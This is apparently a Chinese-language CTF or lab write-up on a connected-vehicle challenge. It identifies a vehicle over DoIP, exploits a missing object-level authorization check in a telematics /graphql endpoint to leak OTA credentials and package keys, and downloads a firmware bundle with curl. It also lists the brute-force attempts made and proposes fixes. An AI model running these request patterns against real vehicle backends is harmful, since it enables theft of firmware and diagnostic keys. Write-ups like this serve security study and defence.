# 任务 01 WP：云侧对象级越权与 OTA 定位

## 0. 一句话

TSP 的 `/graphql` 不是 GraphQL 引擎，而是一个**「字段名 + variables」查表匹配器**。
只要 `variables.vin` 填一个**已登记 VIN**、query 里出现 `vehicleDiagnostics`，它就返回该车的完整 OTA 诊断对象——**没有任何身份或归属校验**。
query 里写的 `(vin: "...")` 参数完全是幌子。

---

## 1. 识别目标车辆（DoIP / ISO 13400-2）

```python
import socket, struct

s = socket.socket(); s.settimeout(5)
s.connect(("10.226.193.2", 13400))
s.sendall(bytes([0x02, 0xFD]) + struct.pack(">H", 0x0001) + struct.pack(">I", 0))   # vehicle identification request
hdr = s.recv(8)
plen = struct.unpack(">I", hdr[4:8])[0]
body = b""
while len(body) < plen:
    body += s.recv(plen - len(body))
```

```
响应 ptype = 0x0004 (vehicle identification response)
VIN            = CV622697F82A936A1
logical address = 0x1000
EID            = 060000001000
GID            = 000000000000
furtherAction  = 0x00
```

辅助确认：`22 F190`（网关 0x1000）返回同一 VIN；`22 F1A0` 返回 `07E0 07E8 07E1 07E9`（两条 ISO 15765-4 动力总成诊断 ID 对）。

---

## 2. `/graphql` 的真实行为

### 2.1 先看它"不是什么"

对任何**合法 JSON** 都返回**字节级相同**的 81 字节：

```json
{"data":{"vehicles":[{"label":"Guest demo vehicle","vin":"CV6000000DEMO0001"}]}}
```

包括 `{}`、`{"query":""}`、`{"query":"{__typename}"}`、语法错误的 query。
只有**非法 JSON** 才走 `400 {"error":"invalid GraphQL request"}`；GET/PUT/HEAD 走 `405`。

**`{__typename}` 这条是关键判据**：真 GraphQL 引擎必然返回 `"Query"`，它却回 guest 数据 ⇒ **它没有 GraphQL 执行器**，只是"解码 JSON → 回常量"。

### 2.2 再找它"是什么"

用**类型错误当字段发现 oracle**：把某个键设成 `123`，如果 handler 真的 `json.Unmarshal` 进结构体，就会因类型不符报错。

| body | 结果 |
|---|---|
| `{"query":123}` | **400** ⇒ `query` 是 string 字段，被解码 |
| `{"variables":123}` | **400** ⇒ `variables` 是 object 字段，被解码 |
| 其余 63 个候选键（token/vin/campaign/key/...） | 全 200 ⇒ 未被解码 |

⇒ handler 只解析 `query` 和 `variables` 两个字段。

### 2.3 契约真相

| 请求 | 结果 |
|---|---|
| `{"query":"query { vehicleDiagnostics(vin:\"CV622697F82A936A1\") { vin } }"}`（**不带** variables） | guest 回退 |
| `{"query":"query { vehicleDiagnostics { vin } }","variables":{"vin":"CV622697F82A936A1"}}`（query 里**不带参数**） | **✅ 返回真实诊断对象** |
| `{"query":"{vehicles{vin}}","variables":{"vin":"CV622697F82A936A1"}}` | guest 回退（字段名必须匹配） |
| `vehicleDiagnostics` + 未登记 VIN（demo / 旧 VIN / 乱写） | guest 回退 |

**⇒ 匹配键是 `variables.vin`；query 里的 `(vin: ...)` 完全不参与判定。**

```json
{"query":"query { vehicleDiagnostics { vin } }","variables":{"vin":"CV622697F82A936A1"}}
```

响应：

```json
{"data":{"vehicleDiagnostics":{
  "campaignId":"CAMP-243892C376D4CB2D5F826953",
  "diagnosticEndpoint":"https://tbox:8443",
  "firmwareCredential":"5e7f07b4a81153ecd5868cc02557f823",
  "firmwareDownload":"/api/v1/ota/engineering-bundle",
  "manifest":"ZIP; AES-256-GCM T-BOX image; mTLS diagnostic bundle; VCU reference image",
  "packageKey":"3ac02bb40567fa14062cc768e22fefac3dd972aee87a3bf2d01419f026d573d0",
  "tboxEndpoint":"http://tbox:8080",
  "vin":"CV622697F82A936A1"
}}}
```

---

## 3. 缺陷本质

接口**完全未授权**：

- 不看任何 header（`Authorization` / `X-API-Key` / `Cookie` / Basic 全试过）
- 不看 `Host`（46 种 vhost 含 VIN 作 Host，响应一致）
- 不区分调用者身份

并且**对象级授权缺失**：`variables.vin` 是外部完全可控的对象标识，服务端直接用它查库并返回，**不校验"这个 VIN 是否属于调用者"**。

⇒ 任何能访问 `:8080` 的客户端，只要知道一个已登记 VIN，就能读走该车的：
**campaign、OTA 工程包路径、诊断入口、工程包凭据、包密钥**。

> 这里也是"云侧一个授权缺陷切入"的入口：`firmwareCredential` 与 `packageKey` 直接给了后续 02/03 的全部材料。

---

## 4. 用越权拿到的凭据下载工程包

`firmwareDownload` 指向 `http://10.225.139.3:8080/api/v1/ota/engineering-bundle`，要求 HTTP Basic（realm `CV6 OTA`）：

```
Basic  diag : <firmwareCredential>
```

```bash
curl -u "diag:5e7f07b4a81153ecd5868cc02557f823" \
  -o bundle.zip http://10.225.139.3:8080/api/v1/ota/engineering-bundle
```

- 用户名恒为 `diag`，密码是 TSP 返回的 `firmwareCredential`
- 错误组合恒回 `401 {"error":"invalid credentials"}`，**无用户名枚举差异**
- 响应头：`Content-Disposition: attachment; filename="cv6-engineering-bundle.zip"`

包内容（约 19.6 KB）：

| 文件 | 大小 | 说明 |
|---|---|---|
| `manifest.json` | 350 B | `CV6-OTA-1` / AES-256-GCM / nonce / `tboxAddress 0x08000000` / `tboxSha256` / `tboxSize 16384` / `vcuRollback 2` / `vcuUpdateAddress 0x08040000` |
| `tbox-firmware.img` | 16412 B | 加密的 T-BOX ARM 镜像（→ 任务 02） |
| `vcu-reference.bin` | 1024 B | VCU 参考镜像，magic `CV6VCU1\0` |
| `diagnostics/ca.pem` | 595 B | `CN=CV6 Fleet Diagnostics Root` |
| `diagnostics/client.pem` | 611 B | `CN=CV6 Engineering Diagnostic Client`（→ 任务 03） |
| `diagnostics/client-key.pem` | 241 B | EC P-256 私钥 |

> **包是按请求动态生成的**：两次下载的 `nonce` 与客户端证书 `notBefore` 都不同，诊断证书是每次现签的，**不存在可跨轮复用的静态 mTLS 材质**。

---

## 5. 排查路线（留档，避免重复劳动）

| 尝试 | 范围 | 结果 |
|---|---|---|
| 根字段 × 参数名穷举 | `vehicle*`/`ota*`/`campaign*`/`firmware*`/`diag*`/`pack*` 等 × 20 种参数名，共 400+ | 全 guest |
| 选择集字典 | 28 字段 × 16 选择集 = 1024（含 `{__typename}`、`{id name packageUrl sha256}`） | 全 guest |
| operationName | 70+ 个（GetVehicles / OtaCampaigns / Login / …） | 全 guest |
| Content-Type / Accept 矩阵 | 6 CT × 4 Accept | 全 guest |
| 认证头 | `Authorization`/`X-API-Key`/`Cookie`/Basic(8 组)/JWT(HS256 10 密钥 + alg=none) | 全 guest |
| 代理身份头 | 45 种（`X-Forwarded-User`、`X-Auth-Request-*`、`X-JWT-Claim-*` 等）× 6 值 = 288 | 全 guest |
| Host / vhost | 46 种（含 `<VIN>`、`tbox`、`cv6.tsp.local`）+ absolute-URI 形式 | 全 guest |
| URL query 参数 | 27 参数 × 5 值 | 全 guest |
| 路径 | 1576 条 × 3 主机 = 5949 请求 | 只有 `/healthz`、`/graphql` |
| 方法 / 路径变体 | `//graphql`(307)、`/./graphql`(200)、`/%67raphql`(200)、POST 流水线、h2c 前言、WebSocket upgrade、SSE `Accept` | 无新面 |
| DoIP 层 | ~4400 个 payload type | 只有 ident/RA/diag |
| 其它端口 | `10.229`/`10.230`/`10.225`/`10.226` 四个 /16 扫 8080/8443/13400 | 只有 4 台主机 7 个开放端口 |

**转折点**是队友给出了 `vehicleDiagnostics` 这个根字段名——但它当时也**只带了 query 参数**，所以同样落回 guest。真正命中是在**把 VIN 放进 `variables`** 之后。

---

## 6. 修复建议

1. 给 `vehicleDiagnostics` 加调用者身份校验，并校验 `VIN ∈ 调用者名下车辆`。
2. 不要用"未命中就回 guest demo"的兜底——它把"字段名不存在"和"无权访问"混成同一个响应，既掩盖了攻击，也让排查极难。应返回明确错误码。
3. `firmwareCredential` / `packageKey` 这类材料不应与诊断元数据放在同一个查询里返回，应拆分权限。

---

## 7. 交付物

| 路径 | 内容 |
|---|---|
| `04_SOLVE/task01/solve_task01.py` | 端到端可重放（DoIP 取 VIN → 越权查询 → 下载 → 解包 → mTLS 验证） |
| `04_SOLVE/uds/tsp_api.py` | TSP `/api/v1/*` 1007 条路径扫描 |
| `03_EVIDENCE/tsp/0100_vehicleDiagnostics_target.json` | 越权查询原始响应 |
| `03_EVIDENCE/tsp/0104_bundle_headers.txt` | 工程包下载响应头 |
| `03_EVIDENCE/tsp/0105_engineering-bundle.bin` | 工程包原件 |

复现：

```bash
python 04_SOLVE/task01/solve_task01.py
```

```
[1] DoIP VIN=CV622697F82A936A1 gatewayLA=0x1000
[2] TSP BOLA -> campaign=CAMP-243892C376D4CB2D5F826953
    ota=/api/v1/ota/engineering-bundle  diagEndpoint=https://tbox:8443
[3] bundle 19624B sha256=...
[4] unpacked: manifest.json / vcu-reference.bin / tbox-firmware.img / diagnostics/*.pem
[5] mTLS verify=OK
```
